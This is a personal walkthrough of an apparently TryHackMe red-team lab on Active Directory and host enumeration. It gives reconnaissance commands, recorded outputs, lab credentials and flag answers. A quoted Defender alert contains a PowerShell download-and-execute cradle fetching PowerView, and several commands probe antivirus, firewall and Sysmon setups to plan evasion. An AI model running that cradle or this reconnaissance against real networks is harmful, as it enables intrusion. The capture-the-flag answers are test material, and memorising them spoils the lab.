@@ -1,0 +1,581 @@
+THE LAY OF THE LAND.
+
+
+
+
+[>>> TASK 1: INTRODUCTION]
+Nothing to do here.
+
+
+
+
+[>>> TASK 2: DEPLOY THE VM]
+[ACTION: connect to machine via rdp]
+sudo apt install freerdp3-x11
+xfreerdp3 /v:10.10.104.211 /u:kkidd
+[NOTE]
+Domain -> kkidd
+Password -> Pass123321@
+
+
+
+[>>> TASK 3: NETWORK INFRASTRUCTURE]
+[CONCEPT: VLAN (Virtual Local Area Network)]
+Definition:
+Network technique used in network segmentation to control networking issues (eg: broadcasting issues) and improve security, since hosts within a VLAN can only communicate with hosts in same VLAN.
+
+
+[CONCEPT: internal networks]
+Definition:
+Subnetworks that are segmented and separated based on importance of internal device or accesibility of its data.
+Use:
+Share information, enable faster/easier communicaiton, network services, etc.
+
+
+[CONCEPT: DMZ (Demilitarized Zone)]
+Definition:
+An edge network that protects and adds an extra security layer to a corporation's internal loal-area network from unstructed traffic.
+Use:
+Subnetwork that sits between public internet and internal networks.
+
+
+[CONCEPT: internal network services]
+Definition:
+Provide private and internal network communication access for internal network devices.
+Internal network services are not accesible outside the network.
+Examples:
+DNS, web servers, custom applications, etc.
+
+
+
+
+[>>> TASK 4: ACTIVE DIRECTORY (AD) ENVIRONMENT]
+[CONCEPT: AD environment]
+Definition:
+Windows based directory service that stores and provides data objects to the internal network environment. 
+Allows centralized managementof authentication and authorization.
+AD components:
+1. Domain controllers.
+2. Organizational units.
+3. AD objects.
+4. AD domains.
+5. Forest.
+6. AD service account.
+7. Domain administrators.
+Example:
+AD contains info such as users and their details (job title, phone number, passwords, groups, permissions, etc.), computers, printers, etc.
+
+
+[CONCEPT: domain controller]
+Definition:
+Windows server that provides AD services and controls the entire domain.
+Form of centralized user management that provides user data encryption and access control.
+
+
+[CONCEPT: OU (Organizational Units)]
+Definition:
+Containers within the AD domain with a hierarchical structure.
+
+
+[CONCEPT: AD objects]
+Definition:
+Can be a single user/group or a hardware component.
+
+
+[CONCEPT: AD domain]
+Definition:
+Collection of Microsoft components within an AD network.
+
+
+[CONCEPT. AD forest]
+Definition:
+Colleciton of domains that trust each other.
+
+
+[COMMAND: info on machine (OS, hostname, hardware, AD domain, etc]
+systeminfo
+
+
+
+[4.1. BEFORE GOING ANY FURTHER, ENSURE THE ATTACHED MACHINE IS DEPLOYED AND TRY WHAT WE DISCUSSED. IS THE ATTACHED MACHINE PART OF THE AD ENVIRONMENT? (Y|N)]
+[ANSWER]
+Y
+
+
+[4.2. IF IT IS PART OF AN AD ENVIRONMENT, WHAT IS THE DOMAIN NAME OF THE AD?]
+[ACTION: run systeminfo to get ad name]
+systeminfo
+[OUTPUT]
+Host Name:                 AD
+OS Name:                   Microsoft Windows Server 2019 Datacenter
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          EC2
+Registered Organization:   Amazon.com
+Product ID:                00430-00000-00000-AA026
+Original Install Date:     3/17/2021, 2:59:06 PM
+System Boot Time:          7/23/2025, 7:38:04 PM
+System Manufacturer:       Amazon EC2
+System Model:              t3a.small
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2200 Mhz
+BIOS Version:              Amazon EC2 1.0, 10/16/2017
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC) Coordinated Universal Time
+Total Physical Memory:     2,016 MB
+Available Physical Memory: 644 MB
+Virtual Memory: Max Size:  2,400 MB
+Virtual Memory: Available: 973 MB
+Virtual Memory: In Use:    1,427 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    thmredteam.com
+Logon Server:              \\AD
+Hotfix(s):                 27 Hotfix(s) Installed.
+                           [01]: KB4601555
+                           [02]: KB4470502
+                           [03]: KB4470788
+                           [04]: KB4480056
+                           [05]: KB4486153
+                           [06]: KB4493510
+                           [07]: KB4499728
+                           [08]: KB4504369
+                           [09]: KB4512577
+                           [10]: KB4512937
+                           [11]: KB4521862
+                           [12]: KB4523204
+                           [13]: KB4535680
+                           [14]: KB4539571
+                           [15]: KB4549947
+                           [16]: KB4558997
+                           [17]: KB4562562
+                           [18]: KB4566424
+                           [19]: KB4570332
+                           [20]: KB4577586
+                           [21]: KB4577667
+                           [22]: KB4587735
+                           [23]: KB4589208
+                           [24]: KB4598480
+                           [25]: KB4601393
+                           [26]: KB5000859
+                           [27]: KB5001568
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Amazon Elastic Network Adapter
+                                 Connection Name: Ethernet 3
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address(es)
+                                 [01]: 10.10.104.211
+                                 [02]: fe80::c1d0:5997:94ef:5150
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+[ANSWER]
+thmredteam.com
+
+
+
+
+[>>> TASK 5: USERS AND GROUPS MANAGEMENT]
+[CONCEPT: AD administrators]
+Types admin accounts:
+1. BUILTIN\administrator: local admin access on domain controller.
+2. Domain admins: administrative access to alll resources in the domain.
+3. Enterprise admins: available only in the forest root.
+4. Schema admins: capable of modifying domain/forest; useful for red teamers.
+5. Server operators: can manage domain servers.
+6. Account operators: can manage users that are not in privileged groups.
+
+
+
+[5.1. USE THE Get -ADUSer -Filter * -SearchBase COMMAND TO LIST THE AVAILABLE USER ACCOUNTS WITHIN THM OU IN THE thmreadteam.com DOMAIN. HOW MANY USERS ARE AVAILABLE?]
+[NOTE]
+Run on powershell, not cmd.
+[ACTION: switch keyboard spanish]
+Set-WinUserLanguageList -LanguageList es-ES -Force
+
+
+
+[ACTION: run requested command]
+Get-ADUser -Filter * -SearchBase "OU=THM,DC=thmredteam,DC=com"
+[OUTPUT]
+DistinguishedName : CN=Pierre Pittman,OU=THM,DC=thmredteam,DC=com
+GivenName         : Pierre
+Name              : Pierre Pittman
+ObjectClass       : user
+ObjectGUID        : 34febcdd-49dc-4160-b88e-7e6323f40dba
+SamAccountName    : ppittman
+SID               : S-1-5-21-1966530601-3185510712-10604624-1113
+Surname           : Pittman
+UserPrincipalName : ppittman@thmredteam.com
+
+DistinguishedName : CN=Dario Philips,OU=THM,DC=thmredteam,DC=com
+GivenName         : Dario
+Name              : Dario Philips
+ObjectClass       : user
+ObjectGUID        : 3cc9cfc7-3c62-4d46-8a83-b8c02f45efbb
+SamAccountName    : dphilips
+SID               : S-1-5-21-1966530601-3185510712-10604624-1114
+Surname           : Philips
+UserPrincipalName : dphilips@thmredteam.com
+
+DistinguishedName : CN=Weronika Burgess,OU=THM,DC=thmredteam,DC=com
+GivenName         : Weronika
+Name              : Weronika Burgess
+ObjectClass       : user
+ObjectGUID        : 88e2935a-2b50-4510-816d-8eab5b06f548
+SamAccountName    : wburgess
+SID               : S-1-5-21-1966530601-3185510712-10604624-1116
+Surname           : Burgess
+UserPrincipalName : wburgess@thmredteam.com
+
+DistinguishedName : CN=Cecil Solomon,OU=THM,DC=thmredteam,DC=com
+GivenName         : Cecil
+Name              : Cecil Solomon
+ObjectClass       : user
+ObjectGUID        : 88ca7ae9-0f03-4956-8916-b0cbd985520c
+SamAccountName    : csolomon
+SID               : S-1-5-21-1966530601-3185510712-10604624-1120
+Surname           : Solomon
+UserPrincipalName : csolomon@thmredteam.com
+
+DistinguishedName : CN=Kevin Kidd,OU=THM,DC=thmredteam,DC=com
+Enabled           : True
+GivenName         : Kevin
+Name              : Kevin Kidd
+ObjectClass       : user
+ObjectGUID        : 42353060-b13d-48b4-af2f-70543e6ca8f8
+SamAccountName    : kkidd
+SID               : S-1-5-21-1966530601-3185510712-10604624-1122
+Surname           : Kidd
+UserPrincipalName : kkidd@thmredteam.com
+
+DistinguishedName : CN=THM Admin,OU=THM,DC=thmredteam,DC=com
+Enabled           : True
+GivenName         : THM
+Name              : THM Admin
+ObjectClass       : user
+ObjectGUID        : 8974cd3d-9bf0-4c43-ac7d-068413fb462c
+SamAccountName    : thmadmin
+SID               : S-1-5-21-1966530601-3185510712-10604624-1124
+Surname           : Admin
+UserPrincipalName : thmadmin@thmredteam.com
+[ANSWER]
+6 (admin counts as user)
+
+
+
+[5.2. ONCE YOU RUN THE PREVIOUS COMMAND, WHAT IS THE UserPrincipalName (EMAIL) OF THE ADMIN ACCOUNT?]
+[NOTE]
+We check previous question output:
+UserPrincipalName : thmadmin@thmredteam.com
+[ANSWER]
+thmadmin@thmredteam.com
+
+
+
+
+[>>> 6. HOST SECURITY SOLUTION #1]
+[COMMAND: enumerate AV software (wmic)]
+wmic /namespace:<namespace> path antivirusproduct
+
+
+[COMMAND: enumerate AV software (powershell)]
+Get-CimInstance -Namespace <namespace> -Classname AntivirusProduct
+
+
+[COMMAND: check service state of Windows Defender]
+Get-Service WinDefend
+
+
+[COMMAND: check service state of specific security service]
+Get-MpComputerStatus | select RealTimeProtectionEnabled
+
+
+[COMMAND: check firewall profiles]
+Get-NetFirewallProfile | Format-Table Name, Enabled
+
+
+[COMMAND: check current firewall rules]
+Get-NetFirewallRule | select DisplayName, Enabled, Description
+
+
+[COMMAND: test inbound connection for firewall]
+Test-NetConnection -ComputerName <ip> -Port <port>
+[Note]
+Additional arguments to consider:
+Test for remote targets: -ComputerName <machine_name>
+Test for domain names: Test-NetConnection <domain_name>
+
+
+
+[6.1. ENUMERATE THE ATTACHED WINDOWS MACHINE AND CHECK WHETHER THE HOST-BASED FIREWALL IS ENABLED OR NOT! (Y|N)]
+[ACTION: check all profiles firewall]
+Get-NetFirewallProfile | Format-Table Name, Enabled
+[OUTPUT]
+Name    Enabled
+----    -------
+Domain    False
+Private   False
+Public    False
+[ANSWER]
+N
+
+
+
+[6.2. USING POWERSHELL CMDLETS SUCH Get-MpThreat CAN PROVIDE US WITH THREATS DETAILS THAT HAVE BEEN DETECTED USING MS DEFENDER. RUN IT AND ANSWER THE FOLLOWING: WHAT IS THE FILE NAME THAT CAUSES THIS ALERT TO RECORD?]
+[ACTION: run Get-MpThreat]
+Get-MpThreat
+[OUTPUT]
+CategoryID       : 8
+DidThreatExecute : False
+IsActive         : False
+Resources        : {CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1');
+                   Get-NetGroupMember 'Domain Admins', internalCmdLine:_i
+                   AQAAAA2wA4AAAAAAAAAAAF8Q02fXQQEAbRa5PR40vlvAdUq6bbN3ro51dwpUcm9qYW46UG93ZXJTaGVsbC9Qb3dlcnNwbG9pdC5HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA== 57 10
+                   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell IEX (New-Object
+                   Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1'); Get-NetGroupMember 'Domain Admins'}
+RollupStatus     : 1
+SchemaVersion    : 1.0.0.0
+SeverityID       : 5
+ThreatID         : 2147725325
+ThreatName       : Trojan:PowerShell/Powersploit.G
+TypeID           : 0
+PSComputerName   :
+
+CategoryID       : 34
+DidThreatExecute : False
+IsActive         : False
+Resources        : {file:_C:\Users\kkidd\Desktop\PowerView.ps1, containerfile:_C:\Users\kkidd\Desktop\PowerView.ps1, file:_C:\Users\kkidd\Desktop\PowerView.ps1->(UTF-8)}
+RollupStatus     : 1
+SchemaVersion    : 1.0.0.0
+SeverityID       : 4
+ThreatID         : 2147755688
+ThreatName       : HackTool:PowerShell/PowerView
+TypeID           : 0
+PSComputerName   :
+
+CategoryID       : 34
+DidThreatExecute : True
+IsActive         : False
+Resources        : {amsi:_C:\Tools\PowerView.ps1, internalamsi:_0296D712FA44FD733F95B0C00E4631FC}
+RollupStatus     : 65
+SchemaVersion    : 1.0.0.0
+SeverityID       : 4
+ThreatID         : 2147762887
+ThreatName       : HackTool:PowerShell/InvKerber.B
+TypeID           : 0
+PSComputerName   :
+[NOTE: relevant output snippet]
+CategoryID       : 34
+DidThreatExecute : True
+IsActive         : False
+Resources        : {amsi:_C:\Tools\PowerView.ps1, internalamsi:_0296D712FA44FD733F95B0C00E4631FC}
+[ANSWER]
+PowerView.ps1
+
+
+
+[6.3. ENUMERATE THE FIREWALL RULES OF THE ATTACHED WINDOWS MACHINE. WHAT IS THE PORT THAT IS ALLOWED UNDER THE THM-Connection RULE?]
+[ACTION: check firewall rules]
+Get-NetFirewallRule | select DisplayName, Enabled, Description
+[NOTE]
+The output is too big to search manually.
+
+
+[ACTION: return all properties of THM-Connection rule]
+Get-NetFirewallRule -DisplayName "THM-Connection" | Format-List *
+[OUTPUT]
+Name                    : {B594EB4B-1EFA-4F7A-A0F3-F90818D9B507}
+ID                      : {B594EB4B-1EFA-4F7A-A0F3-F90818D9B507}
+DisplayName             : THM-Connection
+Group                   :
+Enabled                 : True
+Profile                 : Any
+Platform                : {}
+Direction               : Inbound
+Action                  : Allow
+EdgeTraversalPolicy     : Block
+LSM                     : False
+PrimaryStatus           : OK
+Status                  : The rule was parsed successfully from the store. (65536)
+EnforcementStatus       : NotApplicable
+PolicyStoreSourceType   : Local
+Caption                 :
+Description             : THM-Connection inbound to 17337 Port!
+ElementName             : THM-Connection
+InstanceID              : {B594EB4B-1EFA-4F7A-A0F3-F90818D9B507}
+CommonName              :
+PolicyKeywords          :
+PolicyDecisionStrategy  : 2
+PolicyRoles             :
+ConditionListType       : 3
+CreationClassName       : MSFT|FW|FirewallRule|{B594EB4B-1EFA-4F7A-A0F3-F90818D9B507}
+ExecutionStrategy       : 2
+Mandatory               :
+PolicyRuleName          :
+Priority                :
+RuleUsage               :
+SequencedActions        : 3
+SystemCreationClassName :
+SystemName              :
+DisplayGroup            :
+LocalOnlyMapping        : False
+LooseSourceMapping      : False
+Owner                   :
+Platforms               : {}
+PolicyStoreSource       : PersistentStore
+Profiles                : 0
+RuleGroup               :
+StatusCode              : 65536
+PSComputerName          :
+CimClass                : root/standardcimv2:MSFT_NetFirewallRule
+CimInstanceProperties   : {Caption, Description, ElementName, InstanceID...}
+CimSystemProperties     : Microsoft.Management.Infrastructure.CimSystemProperties
+[NOTE: relevant output snippet]
+Description             : THM-Connection inbound to 17337 Port!
+[ANSWER]
+17337
+
+
+
+
+[>>> TASK 7: HOST SECURITY SOLUTION #2]
+[COMMAND: list available logs on local machine]
+Get-EventLog -List
+
+
+[COMMAND: check if sysmon is available (via process)]
+Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+
+
+[COMMAND: check if sysmon is available (via service)]
+Option 1:
+Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+Option 2:
+Get-Service | where_object {$_.DisplayName -like "*sysm*"}
+
+
+[COMMAND: check if sysmon is available (via registry)]
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+
+
+[COMMAND: find configuration file]
+findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*
+
+
+
+
+[>>> TASK 8: NETWORK SECURITY SOLUTIONS]
+Nothing to do here.
+
+
+
+
+[>>> TASK 9: APPLICATIONS AND SERVICES]
+[COMMAND: list all installed applications and their version]
+wmic product get name,version
+
+
+[COMMAND: find hidden directories]
+Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\
+
+
+[COMMAND: list all running services]
+net start
+
+
+[COMMAND: get path of service]
+wmic service where name like '<name>'" get Name,PathName
+
+
+[COMMAND: get additional information on service]
+Get-Process -Name <name>
+
+
+[COMMAND: filter listening ports by process id]
+netstat -noa | findstr "LISTENING" | findstr "<id>"
+[9.1. FINALLY, WE CAN SEE IT IS LISTENING ON PORT 8080. NOW TRY TO APPLY WHAT WE DISCUSSED AND FIND THE PORT NUMBER FOR THM SERVICE. WHAT IS THE PORT NUMBER?]
+[ACTION: find process name of THM-Service]
+wmic service where "name like 'THM Service'" get Name,PathName
+[OUTPUT]
+Name         PathName
+THM Service  c:\Windows\thm-service.exe
+
+
+[ACTION: get information on the process thm-service]
+Get-Process -Name thm-service
+[OUTPUT]
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+     78       9    12668       5668              2724   0 thm-service
+
+
+[ACTION: filter for ports listening with id 2724]
+netstat -noa | findstr "LISTENING" | findstr "2724"
+[OUTPUT]
+TCP    0.0.0.0:13337          0.0.0.0:0              LISTENING       2724
+  TCP    [::]:13337             [::]:0                 LISTENING       2724
+[ANSWER]
+13337
+
+
+
+[9.2. VISIT THE LOCALHOST ON THE PORT YOU FOUND IN QUESTION#1. WHAT IS THE FLAG?]
+[ACTION: visit http://10.10.78.73:13337/]
+[OUTPUT]
+Hi the flag is: THM{S3rv1cs_1s_3numerat37ed}
+[ANSWER]
+THM{S3rv1cs_1s_3numerat37ed}
+
+
+[COMMANDS: dns enumeration (dns zone transfer)]
+1. Run nslookup.exe:
+nslookup.exe
+2. Provide DNS server to ask (target machine).
+3. DNS zone transfer:
+ls -d <domain_name>
+
+
+
+[9.3. NOW ENUMERATE THE DOMAIN NAME OF THE DOMAIN CONTROLLER, thmredteam.com, USING nslookup.exe, AND PERFORM A DNS ZONE TRANSFER. WHAT IS THE FLAG FOR ONE OF THE RECORDS?]
+[ACTION: run nslookup]
+nslookup.exe
+
+[ACTION: input target ip (10.10.78.73)]
+server 10.10.78.73
+
+[ACTION: enumerate thmredteam.com]
+ls -d thmredteam.com
+[OUTPUT]
+[ip-10-10-78-73.eu-west-1.compute.internal]
+ thmredteam.com.                SOA    ad.thmredteam.com hostmaster.thmredteam.com. (749 900 600 86400 3600)
+ thmredteam.com.                A      10.10.129.59
+ thmredteam.com.                NS     ad.thmredteam.com
+ _msdcs                         NS     ad.thmredteam.com
+ _gc._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=3268, ad.thmredteam.com
+ _kerberos._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=88, ad.thmredteam.com
+ _ldap._tcp.Default-First-Site-Name._sites SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+ _gc._tcp                       SRV    priority=0, weight=100, port=3268, ad.thmredteam.com
+ _kerberos._tcp                 SRV    priority=0, weight=100, port=88, ad.thmredteam.com
+ _kpasswd._tcp                  SRV    priority=0, weight=100, port=464, ad.thmredteam.com
+ _ldap._tcp                     SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+ _kerberos._udp                 SRV    priority=0, weight=100, port=88, ad.thmredteam.com
+ _kpasswd._udp                  SRV    priority=0, weight=100, port=464, ad.thmredteam.com
+ ad                             A      10.10.78.73
+ DomainDnsZones                 A      10.10.129.59
+ _ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+ _ldap._tcp.DomainDnsZones      SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+ flag                           TXT             "THM{DNS-15-Enumerated!}"
+
+ ForestDnsZones                 A      10.10.129.59
+ _ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+ _ldap._tcp.ForestDnsZones      SRV    priority=0, weight=100, port=389, ad.thmredteam.com
+ www                            A      10.10.141.51
+ thmredteam.com.                SOA    ad.thmredteam.com hostmaster.thmredteam.com. (749 900 600 86400 3600)
+[ANSWER]
+THM{DNS-15-Enumerated!}
